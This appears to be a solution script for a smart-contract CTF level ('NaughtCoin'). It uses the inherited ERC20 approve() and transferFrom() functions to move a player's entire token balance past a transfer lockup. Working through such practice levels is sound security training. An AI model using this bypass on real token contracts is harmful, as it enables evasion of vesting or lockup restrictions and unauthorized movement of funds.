/*
Tools needed for this level:
- Console
*/

// 1.- Get our token balance
balance = String(await contract.balanceOf(player));

// 2.- Execute the approve() function of the inherited ERC20 contract on NaughtCoin.
// This will allow us to transfer all of our tokens since the default value is "0".
await contract.approve(player, balance, {from: player});

// 3.- Check if we are now allowed to transfer tokens.
String(await contract.allowance(player, player));

// 4.- Execute the transferFrom() function of the inherited ERC20 contract on NaughtCoin.
await contract.transferFrom(player, 'replace_with_any_address', balance);
